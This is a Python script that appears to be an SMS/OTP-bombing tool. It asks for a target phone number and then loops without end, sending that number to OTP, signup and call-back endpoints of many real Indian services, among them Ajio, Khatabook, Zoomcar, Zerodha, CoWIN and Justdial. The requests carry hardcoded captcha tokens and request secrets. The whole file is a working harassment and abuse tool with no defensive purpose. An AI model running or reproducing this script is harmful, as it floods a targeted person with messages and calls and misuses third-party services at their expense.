import requests
import random
import threading
import string
import logging
import random
import string

number = input("Enter target number : ")

global Header
global N

N = 10

Header = {
		"user-agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
	}

def poonaCollege(number):
	url = "https://akipoona.vriddhionline.com/Alumni_03A_User_Alumni_Register_OCMS2.aspx?DateTime=7%2f17%2f2022+2%3a47%3a03+AM&ID=HVQQN4SH&PID=7Z9TUybxVvWBKoTchhceQpHX%2fEBivdV0USBBKLHKoGjkTqrcX6YXmItFkZwj0EDC"
	payload = {
	'__EVENTTARGET': '',
	'__EVENTARGUMENT': '',
	'__VIEWSTATE': 'wxw+Qda6cOb9OCEcOOKeSONlq7uGYJA9SLYK23+aBy+13fPcd814aDiJ8T5X0dgStFPPoe0Z4MqplGgqGIc5HRaQShFzJhqUUnu7tG7UiaY//Ud+GocgeDbChbSGBicoyVhj9+CL3V74SUFQC2q/K76a16wsluxiMNquZVdSGqdPCT0RENv23eUno04aX9G1PIdPTd2bhv/3wdSOcKnWO9K0jmJsBz+LNQgt+mGGBhEE/1MrEh6eBdjIGblWlw2tOKPAJYNblCcKGB82WSmrWv90IL14Rg7u36REq8aIFAqTKzCNI2F4i8lF3d6hmHO/TMq78vCdyK5m0TqJRA6BJXK4aGq2IINdeQYq24jFqZPllHf65C+ButoSBbwi5V8TpDG7HFuFEbijEgjQn8CYfLvd4C7iXuFP9fpLxjkSc92HPuHBpNinZiWGYu2wVy1mL8h8sQ1RH3gH3WhnNOccLPPWCFJAtVTcrfivcc6VKW3tWFiYkGJXZJMf/ERbmS9UVAdZiiCz9a4kMAJVvB9dPXNeFE0iFlj7wT8Arnx3vZr8qvx1HbJXayRB74uXqjX5hxZaJzyuh+9VfgN/SiThvK5axEPVf/HFHNsZJR++553bvwudmNAcvm4/N7FMhqPwpEERCcnUEiX0w4fXhuCMCx3v3/P50c0dDYUxPCJRDQIW45Uwi8cVa4DTmR6kox6cyrTN2wXfG3pwhej99V90F+v2h/spJ1bqSxQghFDi0PrnELpIMeQCssSwyYnNndWTjvN9MIMrQ7KLDP9XvgBxGUB+V5AV9Isc6kXm+8LLpzzMuRGHoLiCnshyDzYxnmG1E01ZoCf7M6zlrDeGriZNqDfVgyOMwW1xK3HL6FwKx41aWJQzqNXRyihwsBTmdloW0Q8nZtttUbLQmDu7bhnd5S9jgzkHmvBHUM0SeGFZFERVF/pAZjb97jYLQIKP5lyTIRo0d1q8p8prIXZ3T5d34YT3AGrn61iagj/PxHpdxB3Isz1IjjI9eIdGFZMpzO/sylLpSyb7J0AUkT3oMv7GLRtFaph8GsRgRN2zPNkel8h85Ap/TFa1mCZlGL3qu65IE0qiKFnf6Zq6xVtnvZpRDuDbKcrwTeF0D+iEP4ZBZc4zu26p4ziO4VUjjYlN4ZL+mC23GROoOLh0ExWsWBrv81yU+vQgtxJBrqSSINxbLSiz35HEwo8+uYmTox9+zVByC/3ywcOoRfDd9Gw9IA35IbuLzEGh2qYbsOJ37ceZ9BSZThRLoPx+9WHE0/9daub9',
	'__VIEWSTATEGENERATOR': '5973DCBD',
	'__PREVIOUSPAGE': 'pcOJ73fSeWqZolOHyyP57BrGYVDIChDSTBJyMOSGJKs-k2Up5xTylf2_eQa1zRTO-4IRFOS1KKRwOHC_YOCCirWCdY5oqZh7Ryzhz5UPdfnlcoGiqtSMe70wPXLSGiBm0',
	'__EVENTVALIDATION': 'h4ftNnwtxXD07lVTCZrGUcayv1ApUC0yjABAuM1Md+jmH2tOQN8u//3noRR1uYpFI0kplcXtBPqWm+Wovh687nATDH9F4pbul0fl2lwXkSUtYIUvuewr1BwbHh1wXKxSwIXHKy9fh7GJowGH6n8FyBEdrvvYA+5VJskzo5zCFKiigPFAprLHxeNTi9WKODA0f8jSbdQxVUqa9vfTivcb62mmE0ZnRS+Tor+ezkY6z4mred/Efb4XwAJxkoG/W3qPtLP8JeLtL/C7qfv85KxS8lFL3w3KosJjqgNrKtMlScx9nV9+6JNb6UAY3VpCyCA0vJmCpV4uaGSx1GQIfyce/BnlEk7PeqMjMUp+yYgtpUd834AvRZVg1xIF1eCLXkqeRUBqpK5UL/6MyDN/T1W16lXIkzvsgTXV9B9HiIRFPqPCv2zB/x+nUrP4wGuwl1Nx',
	'ctl00$hdnClgID': 'PUNE.POONA_COLLEGE',
	'ctl00$ContentPlaceHolder1$hdnClgID': 'PUNE.POONA_COLLEGE',
	'ctl00$ContentPlaceHolder1$txtAlumniMobile': number,
	'ctl00$ContentPlaceHolder1$txtAlumniEmail': 'testingapi@gmail.com',
	'ctl00$ContentPlaceHolder1$btnOpr': 'Click to Register'
}
	x = requests.post(url, data=payload, headers=Header)
	if len(x.text) != 0:
		print("Sent SMS to ",number)
	else:
		print("ERROR ", x.text)

def ajio(number):
	N = 7
	random_name = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase, k=N))
	url = "https://login.web.ajio.com/api/auth/signupSendOTP"
	payload = {"firstName":random_name,"login":"random@email.com","password":"Password@123781","genderType":"Female","mobileNumber":number,"rilFnlRegisterReferralCode":"","requestType":"SENDOTP","newDesign":'false'}
	x = requests.post(url, json=payload)
	print(x.text)

def rummyOTP(number):
	url = "https://exec.rummytime.com/prod/sign-up-otp"
	payload = {"mobile":number}
	x = requests.post(url, json=payload)
	print(x.text)

def gomechanic(number):
	url = "https://gomechanic.app/api/send_otp/"
	payload = {"number":number,"source":"website"}
	x = requests.post(url, json=payload)
	print(x.text)

def rummy(number):
	url = "https://api.rummytime.com/api/user/sendAppDownloadLink"
	payload = {
		'mobile': number
	}
	headers = {
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
	}
	x = requests.post(url, json=payload, headers=Header)
	print(x.text)

def khatabook(number):
	url = "https://api.khatabook.com/v1/auth/request-otp"
	payload = {
		"country_code":"+91",
		"phone":number,
		"app_signature":"Jc/Zu7qNqQ2",
		"enableUserPref":"true"
	}
	r = requests.Session()
	resp = r.post(url=url, data=payload, headers=Header).text
	print(resp)

def function1(number):
	url = "https://www.brevistay.com/web-api/verify-user"
	payload = {
		"mobileNumber": number
	}
	r = requests.Session()
	resp = r.post(url=url, data=payload).text
	print(resp)
	r.close()

def function2(number):
	url = "https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php?mobile="+number
	r = requests.Session()
	resp = r.get(url=url, headers=Header).text
	print(resp)
	r.close()

def function3(number):
	random_mail = ''.join(random.choices(string.ascii_uppercase + string.digits, k = N))
	url = "https://www.zoomcar.com/users"
	payload = {
		"platform": "web",
		"phone": "+91"+number,
		"email": random_mail+"@"+random_mail+".com",
		"name": random_mail,
		"password": "TG1hZHdkMTIxMjEyMQ==",
		"captcha_token": "03AGdBq25AYt0W8SXR596gtGvLsT1H-N9nnqguItArzwvoJMhk3jEir4fdmTAOnmEJHGn3cQ0STjkFvcd3CsHYdDXx_O7GX_A2sg8SnpobjbeiLhEBmKGaX72X6baG8QzNMiDn7ALpv5IPLf7AWMK8HlRxzfMgcndtFguLM-A4P5gWOdbg265CUtWCEGXdjyCRCFzQazzRZKVnxW7oDXdZntzrOh5pH7dNqhdyOpi5vLAi5Awg65a-mxWvSRSUIhPGU5jZ_AMPDhgubjIOvf7iUGKlfKKW1UxE5bqew65yOiDCxcVSeZxCh5A4JXBanA1sOXxWqU-X_mnqsD_H0Ld6D0iZfni5jrX4femd0Jw2d8XMiOilVTpMYupNto8I4IApyBsWRzYmcOOHYhlb4Z5Car_XQyJVO5PLnb9jp575fdJ7CI3Tp2WbgoKOpvHLdbpFlFnBR8FNduJ5fDn2jSzkR8-yR9ftykEpbqZOXlrxXrJBN5aJLUEhFij2yR9uHBZ1OGwscPXsQDMaHCTI5iaEKfk-Jo_Xfb5WXvzsouL18Bor412obexa-CuepoZ3oDf0pa2_AX3ewDB34l7OMwWNrIoRWBc0YHW_CpD69NSnXCwAYOyXdZ1zFtvhdDRJGDODrximzpMVoj9TmqqdFrpw8FNbTOxfBtWH9Ul5Fj0eKnC1DKX9f_-T3FPUxxTTU0UCe7AbiUSL2vAiSYKHRwYlk8cYBEU5qE16KIXatjST5UeRGgL6sNKIgUkJJlhpwEHGXZxvsskoC0gLG8w0RKWR9odZn-w-QxY1EIzaCuOAiBBrnvywDl6z7RZK5lBO-L56cdzAwWP_W3kLIjm4f6DmLPngH4PHbiydPYfY2VWHjuU_hWzPD7BEzZnrW8QD4oAieenUQoCyxPpawfDFKBm5iNC3Jp_522znqhTk05sBPXC3aB5jWGMMVmd2CXtnY3on27IgkwPFEkQl0v3OXyz7pq0kx0EnxdpmcJVNSlpnbNX1Q7JGS5Hu4d199zK5rIXJWQB6UfPqQ3AceNESiVwd2nu9X8E6j9H1eVs6g_a_HtQ0nEcwLmhmy2N91D5OX5VSjzgW5t-2PttZBsi3iH0Y4v-G4_cKx8FxZOPu55dXT1azvgAU90S6t7t2vzoAotNGqSpkiUOvnzKOjS3xYJic8WZoBjFhWElIx_UPOLU52IpQ73BhrohErY724uaQcWUCsV33VlTHg3zBvm9cz7-NBWN-JFrtWueP4pccS_ZjJC2-1COLbSqX5utLfs7mqDXrXWmp0rwXeUS6TvhV9jImYkvbnzfNF2Dvaw",
		"is_booking_flow": "false",
		"city": "manila",
		"locale": "en",
		"country_code": "PH"
	}
	r= requests.Session()
	resp = r.post(url=url, data=payload, headers=Header).text
	print(resp)
	r.close()

def function4(number):
	url = "https://clicktobuy.hyundai.co.in/ctb/bank/generateOtpForAuthentication.ctb"
	payload = {
		"cstmMob": number
	}
	r = requests.Session()
	resp = r.post(url=url, data=payload, headers=Header).text
	print(resp)
	r.close()

def function5(number):
	url = "https://login.indiamart.com/users/OTPVerification/"
	payload = {
		"token": "imobile@15061981",
		"mobile_num": number,
		"glusrid": "149673041",
		"modid": "MY",
		"user_mobile_country_code": "91",
		"flag": "OTPGen",
		"user_ip": "116.261.89.107",
		"user_country": "IN",
		"process": "OTP_SignInForm_Desktop",
		"user_updatedusing": "Sign IN Form Desktop",
		"OTPResend": "1",
	}
	r = requests.Session()
	resp = r.post(url=url, data=payload, headers=Header).text
	print(resp)
	r.close()

def function6(number):
	custom_header = {
		"X-Requested-With": "XMLHttpRequest",
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36",
		"Cookie": "_hjFirstSeen=1; _hjIncludedInPageviewSample=1; _hjSession_198698=eyJpZCI6ImZjNmYxZjFiLTQ4MDYtNDAxOS04MWNhLTc1OWY0ZGQ0ZGFiNiIsImNyZWF0ZWQiOjE2NDc4NDY1NzM2NjAsImluU2FtcGxlIjp0cnVlfQ==; _hjAbsoluteSessionInProgress=1; _hjSessionUser_198698=eyJpZCI6Ijg1NGE4MTdkLTMwOWMtNWEzYy05OTQ3LTE1NGM0ZjQzYTk4MSIsImNyZWF0ZWQiOjE2NDc4NDY1NzI4MjgsImV4aXN0aW5nIjp0cnVlfQ==/"
	}
	url = "https://all2.freecallinc.com/voip/price_check/ajax_phone_check_sip.php?cid=30089&phone=%2B91"+number
	_url = "https://p.freecallinc.com/voip/conference/initiate_call.php?phone=+91"+number+"&cid=30089&sid=29655&lng=english&mode=&call_me_phone_country=in&http_refferer=http%3A%2F%2Fwww.lahotelmetro.com%2F&dtitle=LA+METRO+HOTEL+%7C+Luxury+%7C+Peace+%7C+Comfort+%7C+Mumbai+%7C+Indiaerr_cycle%3D1"
	r = requests.Session()
	resp = r.get(url=url,headers=custom_header).text
	r.headers.update({"Referer": "https://p.freecallinc.com/voip/conference/tel-input/we_will_call_you.php?cid=30089&sid=29655&mode=&lng=english&http_refferer=http%3A%2F%2Fwww.lahotelmetro.com%2F&dtitle=LA+METRO+HOTEL+%7C+Luxury+%7C+Peace+%7C+Comfort+%7C+Mumbai+%7C+Indiaerr_cycle=1&&error_code=31208"})
	_resp = r.post(url=_url, headers=custom_header).text
	print(resp)
	print(_resp)
	r.close()

def function7(number):
	url = "https://zerodha.com/account/registration.php"
	payload = {
		"mobile": number,
		"partner_id": "ZMPHKJ",
		"source": "zerodha"
	}
	r = requests.Session()
	resp = r.post(url=url, data=payload, headers=Header).text
	print(resp)
	r.close()

def function8(number):
	url = "https://cdn-api.co-vin.in/api/v2/auth/generateMobileOTP"
	payload = {
		"mobile": number,
		"secret": "U2FsdGVkX18cBTFTIpihbT0awxxeALI11h+8ahAwP3VSE3hRMRd5Nj7eTmChKJoFK+WTmXbk5egH/KenDCBEEA=="
	}
	r = requests.Session()
	resp = r.post(url=url, data=payload, headers=Header).text
	print(resp)
	r.close()
while True:
	try:
		F = threading.Thread(target=poonaCollege, args=(number,))
		F.start()
		F.join()
		E = threading.Thread(target=ajio, args=(number,))
		E.start()
		E.join()
		D = threading.Thread(target=rummyOTP, args=(number,))
		D.start()
		D.join()
		C = threading.Thread(target=gomechanic, args=(number,))
		C.start()
		C.join()
		B = threading.Thread(target=rummy, args=(number,))
		B.start()
		B.join()
		A = threading.Thread(target=khatabook, args=(number,))
		A.start()
		A.join()
		a = threading.Thread(target=function1, args=(number,))
		a.start()
		a.join()
		b = threading.Thread(target=function2, args=(number,))
		b.start()
		b.join()
		c = threading.Thread(target=function3, args=(number,))
		c.start()
		c.join()
		d = threading.Thread(target=function4, args=(number,))
		d.start()
		d.join()
		e = threading.Thread(target=function5, args=(number,))
		e.start()
		e.join()
		f = threading.Thread(target=function6, args=(number,))
		f.start()
		f.join()
		g = threading.Thread(target=function7, args=(number,))
		g.start()
		g.join()
		h = threading.Thread(target=function8, args=(number,))
		h.start()
		h.join()
	except KeyboardInterrupt:
		logging.info("Program Exited By User")
		break
	else:
		pass
	finally:
		pass
